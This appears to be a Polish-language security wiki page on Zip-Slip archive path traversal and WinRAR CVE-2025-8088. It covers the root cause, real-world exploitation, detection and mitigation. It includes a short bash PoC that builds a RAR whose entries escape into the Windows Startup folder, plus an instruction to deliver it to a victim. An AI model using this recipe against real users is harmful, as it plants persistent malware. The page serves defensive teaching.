# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Overview

Wiele formatów archiwów (ZIP, RAR, TAR, 7-ZIP itp.) pozwala każdemu wpisowi na posiadanie własnej **wewnętrznej ścieżki**. Gdy narzędzie do ekstrakcji bezmyślnie honoruje tę ścieżkę, stworzona nazwa pliku zawierająca `..` lub **ścieżkę absolutną** (np. `C:\Windows\System32\`) zostanie zapisana poza wybranym przez użytkownika katalogiem. Ta klasa podatności jest powszechnie znana jako *Zip-Slip* lub **przechodzenie ścieżki ekstrakcji archiwum**.

Konsekwencje wahają się od nadpisywania dowolnych plików po bezpośrednie osiągnięcie **zdalnego wykonania kodu (RCE)** poprzez umieszczenie ładunku w lokalizacji **auto-run**, takiej jak folder *Startup* systemu Windows.

## Root Cause

1. Atakujący tworzy archiwum, w którym jeden lub więcej nagłówków plików zawiera:
* Relatywne sekwencje przejścia (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Ścieżki absolutne (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
2. Ofiara wyodrębnia archiwum za pomocą podatnego narzędzia, które ufa osadzonej ścieżce zamiast jej oczyszczać lub wymuszać ekstrakcję poniżej wybranego katalogu.
3. Plik jest zapisywany w lokalizacji kontrolowanej przez atakującego i wykonywany/ładowany następnym razem, gdy system lub użytkownik wywoła tę ścieżkę.

## Real-World Example – WinRAR ≤ 7.12 (CVE-2025-8088)

WinRAR dla systemu Windows (w tym `rar` / `unrar` CLI, DLL i przenośne źródło) nie zweryfikował nazw plików podczas ekstrakcji. Złośliwe archiwum RAR zawierające wpis taki jak:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
skończyłby **na zewnątrz** wybranego katalogu wyjściowego i wewnątrz folderu *Startup* użytkownika. Po zalogowaniu Windows automatycznie wykonuje wszystko, co się tam znajduje, zapewniając *trwałe* RCE.

### Tworzenie PoC Archiwum (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Opcje użyte:
* `-ep`  – przechowuj ścieżki plików dokładnie tak, jak podano (nie **przycinaj** wiodącego `./`).

Dostarcz `evil.rar` ofierze i poinstruuj ją, aby rozpakowała go za pomocą podatnej wersji WinRAR.

### Obserwowana Eksploatacja w Naturze

ESET zgłosił kampanie spear-phishingowe RomCom (Storm-0978/UNC2596), które dołączały archiwa RAR wykorzystujące CVE-2025-8088 do wdrażania dostosowanych backdoorów i ułatwiania operacji ransomware.

## Wskazówki dotyczące wykrywania

* **Inspekcja statyczna** – Wypisz wpisy archiwum i oznacz wszelkie nazwy zawierające `../`, `..\\`, *ścieżki bezwzględne* (`C:`) lub niekanoniczne kodowania UTF-8/UTF-16.
* **Ekstrakcja w piaskownicy** – Rozpakuj do jednorazowego katalogu za pomocą *bezpiecznego* ekstraktora (np. `patool` w Pythonie, 7-Zip ≥ najnowsza wersja, `bsdtar`) i zweryfikuj, czy wynikowe ścieżki pozostają w katalogu.
* **Monitorowanie punktów końcowych** – Powiadom o nowych plikach wykonywalnych zapisanych w lokalizacjach `Startup`/`Run` krótko po otwarciu archiwum przez WinRAR/7-Zip itd.

## Łagodzenie i Wzmocnienie

1. **Zaktualizuj ekstraktor** – WinRAR 7.13 wdraża odpowiednią sanitację ścieżek. Użytkownicy muszą ręcznie go pobrać, ponieważ WinRAR nie ma mechanizmu automatycznej aktualizacji.
2. Rozpakowuj archiwa z opcją **„Ignoruj ścieżki”** (WinRAR: *Rozpakuj → "Nie rozpakowuj ścieżek"*) gdy to możliwe.
3. Otwieraj nieufne archiwa **w piaskownicy** lub VM.
4. Wdrażaj białą listę aplikacji i ogranicz dostęp do zapisu użytkowników do katalogów auto-uruchamiania.

## Dodatkowe przypadki dotknięte / historyczne

* 2018 – Ogromne *Zip-Slip* ostrzeżenie od Snyk dotyczące wielu bibliotek Java/Go/JS.
* 2023 – 7-Zip CVE-2023-4011 podobne przejście podczas łączenia `-ao`.
* Jakakolwiek niestandardowa logika ekstrakcji, która nie wywołuje `PathCanonicalize` / `realpath` przed zapisem.

## Odnośniki

- [BleepingComputer – Wykorzystanie zero-day WinRAR do zainstalowania złośliwego oprogramowania podczas ekstrakcji archiwum](https://www.bleepingcomputer.com/news/security/winrar-zero-day-flaw-exploited-by-romcom-hackers-in-phishing-attacks/)
- [WinRAR 7.13 Zmiany](https://www.win-rar.com/singlenewsview.html?&L=0&tx_ttnews%5Btt_news%5D=283&cHash=a64b4a8f662d3639dec8d65f47bc93c5)
- [Snyk – Opis podatności Zip Slip](https://snyk.io/research/zip-slip-vulnerability)

{{#include ../banners/hacktricks-training.md}}
